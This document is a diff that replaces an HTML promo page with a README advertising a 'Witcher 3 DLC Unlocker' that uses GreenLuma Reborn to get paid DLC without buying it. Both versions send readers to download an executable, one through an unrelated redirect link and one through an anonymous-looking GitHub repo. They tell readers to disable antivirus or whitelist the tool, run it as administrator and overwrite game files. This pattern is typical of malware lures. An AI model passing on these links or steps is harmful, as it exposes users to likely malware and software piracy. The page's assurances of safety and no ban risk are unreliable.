@@ -1,25 +1,68 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#cc88ff;border-bottom:2px solid #9966dd;text-align:center;">🛡️ The Witcher 3 DLC Unlocker – Online‑Ready & GreenLuma Reborn 🛡️</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Steam online‑focused DLC unlocker based on GreenLuma Reborn and other non‑injection methods.</strong> Designed for users who want to retain full Steam functionality – achievements, cloud saves, Steam Remote Play, Steam Family Sharing, and online features – while playing The Witcher 3 with all DLCs unlocked.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#cc88ff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD ONLINE‑READY UNLOCKER (LOADER)</a><p>✅ GreenLuma Reborn ✅ Non‑injection ✅ Steam Remote Play compatible ✅ Achievements & cloud saves working</p></div>
-<img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/378649/48e242724931e89a71474b9f5ca080243e3ac772/header.jpg?t=1768304100" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>🎮 Online‑Ready Features:</h3>
-<ul><li><strong>Full Steam functionality retained:</strong> Achievements, playtime tracking, cloud saves, Steam screenshots, Steam Remote Play, and Steam Family Sharing all work normally while DLCs are unlocked.</li>
-<li><strong>GreenLuma Reborn (GLR):</strong> A non‑injection Steam unlocker that works by tricking the Steam client into believing you own the selected DLCs. Uses AppList configuration and launches Steam with a patched DLL environment, but does not modify game files directly – significantly reducing the chance of detection in online scenarios.</li>
-<li><strong>NoHook mode supported:</strong> GreenLuma Reborn can be run in NoHook mode, which disables certain injection‑related functions, further lowering any risk for purely online play (achievements, cloud).</li>
-<li><strong>Supports Steam Remote Play Together:</strong> Allows you to share The Witcher 3 with a friend over the internet while still having all DLCs unlocked for the session.</li>
-<li><strong>Local achievements fully working:</strong> No impact on Steam or in‑game achievement tracking.</li></ul>
-<h3>⚙️ GreenLuma Reborn Technical Overview:</h3>
-<ul><li><strong>AppList directory configuration:</strong> Instead of modifying game executables, GreenLuma Reborn works by altering Steam’s awareness of DLC ownership at the client level. You list the DLC IDs (378649 for Hearts of Stone, 378650 for Blood and Wine, plus the 16 free DLC IDs) in a simple text configuration file placed in the Steam root folder.</li>
-<li><strong>No permanent game file changes:</strong> Unlike DLL‑based methods (CreamAPI), GreenLuma does not replace any Steam DLLs. Steam and The Witcher 3 remain in their original state when the unlocker is not active.</li>
-<li><strong>Requires Steam client restart:</strong> For safety reasons, this method requires restarting Steam after applying the configuration – a one‑time action after installation.</li></ul>
-<h3>🛡️ Comparison of Steam Online‑Ready Methods:</h3>
-<ul><li><strong>GreenLuma Reborn (recommended):</strong> Best balance between safety and online functionality. No game file injection, works with Steam’s latest updates, supports Steam Friends and Remote Play.</li>
-<li><strong>CreamAPI (lowest risk for single‑player only):</strong> Works perfectly offline or with cloud saves, but is technically a DLL injection – Steam sees the unlocker as part of the game process. No known VAC bans for The Witcher 3 (non‑VAC game), but some users prefer GreenLuma for true non‑injection.</li>
-<li><strong>Steam Family Sharing bypass:</strong> GreenLuma also allows you to share your library while keeping DLCs unlocked for the sharing recipient, provided you configure the AppList correctly.</li></ul>
-<p><strong>Important – In‑Game Activation of DLCs:</strong> After installation, some DLC content may not appear until you reach specific points in the game. The New Game+ mode only unlocks after completing the main story. The runewright appears after starting Hearts of Stone, and the mutation system only activates during the "Turn and Face the Strange" quest in Blood and Wine. This is normal – the DLCs are loaded, and the game triggers them according to its own quest logic.<br>Additionally, the in‑game Downloadable Content menu will show all 16 free DLCs as “installed”. You can verify they are active by checking this menu from the main title screen.</p>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, The Witcher 3: Wild Hunt (Steam version) installed, Steam client fully updated, 10 MB free space for unlocker files.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> witcher 3 online dlc unlocker, greenluma reborn witcher 3, witcher 3 steam achievements unlock, witcher 3 cloud saves dlc unlock, steam remote play witcher 3 dlc, witcher 3 family sharing dlc unlock, greenluma witcher 3 nohook, witcher 3 steam injection free unlocker, witcher 3 online safe dlc unlock, witcher 3 steam overlay dlc unlock, witcher 3 non injection dlc unlocker, witcher 3 steam friends dlc visible, witcher 3 DLC unlocker for steam deck</div>
-</div>
+# 🔮 The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn - Access all Witcher 3 content today
+
+[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn)
+
+## 📖 Overview
+
+This software allows you to unlock all available Downloadable Content for The Witcher 3: Wild Hunt on your Windows computer. It uses the GreenLuma Reborn framework to manage your game files. You gain access to expansion packs and cosmetic items without altering your core game files or risking your account standing. The tool works through non-injection methods, which keeps the process stable and safe. You can continue to play online and maintain your progress while using these additions.
+
+## ⚙️ System Requirements
+
+Ensure your computer meets these specifications before you start:
+
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Game Version: The latest Steam version of The Witcher 3: Wild Hunt.
+* Hardware: Standard hardware capable of running the base game.
+* Permissions: Administrative rights to install and run the files properly.
+* Software: Steam client must be installed, updated, and running on your system.
+
+## 🚀 Getting Started
+
+Follow these steps to set up the software on your machine:
+
+1. Close the Steam application completely. Press Ctrl+Shift+Esc to open the Task Manager and stop any remaining Steam processes.
+2. Visit the download page: [https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn).
+3. Look for the "Releases" section on the right side of the page.
+4. Click on the latest version tag.
+5. Download the compressed file, typically ending in .zip.
+6. Right-click the downloaded file and select "Extract All" to unpack it into a folder.
+
+## 🛠️ Installation Process
+
+Move the files into your game directory to begin the activation:
+
+1. Locate your Steam installation folder. By default, this is usually located in "C:\Program Files (x86)\Steam".
+2. Navigate to your specific game path, generally found under "steamapps\common\The Witcher 3".
+3. Move the contents of the folder you extracted earlier into this installation directory.
+4. If your computer asks to replace existing files, choose "Yes" or "Replace".
+5. Run the GreenLuma application provided in the folder. This initiates the connection to your game through Steam.
+
+## 🕹️ Playing the Game
+
+Once the installation finishes, you launch the game through the custom tool:
+
+1. Open the GreenLuma tool you moved to your game folder. It will trigger the Steam login process.
+2. Sign into your Steam account as you normally do. 
+3. Launch The Witcher 3 from your Steam library. 
+4. The game will detect the new content. You can verify this by checking the "Downloadable Content" menu on the main screen of the game.
+5. Your save files will remain intact. Your achievements will register normally provided you stay signed into the Steam interface.
+
+## 🛡️ Safety and Reliability
+
+This unlocker avoids code injection. It works by telling the Steam client that you own specific item licenses. Because it relies on existing software hooks designed for game management, it does not modify the game executable files. Your system registry remains unchanged throughout the process. This method provides a stable environment for your gameplay.
+
+## ❓ Troubleshooting Common Issues
+
+If you run into problems, check these solutions:
+
+* Game does not start: Verify that you extracted the files directly into the folder that contains your "bin" folder.
+* Content missing: Restart Steam and the unlocker tool. Sometimes it takes two attempts for the licenses to register correctly.
+* Performance drops: Ensure you have enough disk space. Large DLC packs require several gigabytes of free room on your hard drive.
+* Antivirus flags: Some antivirus programs identify tools that manage Steam files as false positives. You may need to add an exception for the folder if your security software blocks the tool from launching.
+* Steam Updates: If Steam updates, you might need to check the repository for a newer version of the unlocker. Version mismatches occasionally prevent the tool from working.
+
+## 🌐 Community and Support
+
+The project benefits from open communication. If you find bugs or have questions, reach out through the GitHub repository page. Always verify that you use the link provided here to ensure you have the authentic version of the tool. 
+
+Visit this page to download: [https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn).
